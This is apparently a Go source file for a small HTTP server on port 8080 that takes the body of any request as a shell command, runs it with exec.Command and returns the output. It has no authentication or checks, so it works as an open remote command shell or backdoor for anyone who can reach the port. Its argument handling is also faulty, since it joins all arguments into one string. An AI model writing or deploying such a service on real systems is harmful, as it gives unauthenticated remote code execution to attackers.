package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
)

func runCommand(command string) string {
	commandStructure := strings.Split(command, " ")

	args := commandStructure[1:]
	fmt.Println(args)

	spacedArgs := strings.Join(args, " ")

	commandOutput, err := exec.Command(commandStructure[0], spacedArgs).Output()
	if err != nil {
		return err.Error()
	}
	return string(commandOutput)
}

func handler(w http.ResponseWriter, r *http.Request) {
	bodyBytes, err := ioutil.ReadAll(r.Body)
	if err != nil {
		panic(err)
	}
	bodyString := string(bodyBytes)
	output := runCommand(bodyString)
	fmt.Fprintf(w, output)
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}
